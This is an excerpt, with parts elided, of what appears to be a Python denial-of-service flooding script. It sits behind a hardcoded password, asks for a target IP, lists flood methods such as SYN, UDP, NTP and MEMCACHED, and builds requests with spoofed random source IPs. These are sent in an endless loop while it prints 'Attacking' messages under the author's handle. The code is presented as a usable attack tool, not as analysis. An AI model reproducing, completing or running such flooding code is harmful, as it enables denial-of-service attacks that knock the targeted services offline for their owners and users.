...
if password == ("WARNING LEAK"):
    os.system("clear")
    print(f"[+] Acc Logs >> From >> [Unknow User] >> @AsLtroXAiTroGanz")
    print(" ")
    ip = str(input("""╔═══[ TARGET ]
╚════> """))
...
def GetMethodByName(method):
    ...
    elif method in ("SYN", "UDP", "NTP", "POD", "ICMP", "MEMCACHED", "IGMP"):
...
def run():
    ...
    randomip  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
    request  = get_host + forward + get_data + connection + useragent + forwards + header + length + spoofer + GetMethodByName + randomip + referer + content + accept + "\r\n"
    data = random._urandom(90048)
    while True:
        try:
            ...
            for x in range(times):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print(f" AsLtroXAiTroGanz - Attacking {ip} ")
        except :
            print(f" AsLtroXAiTroGanz - Attacking {ip} ")
            s.close()
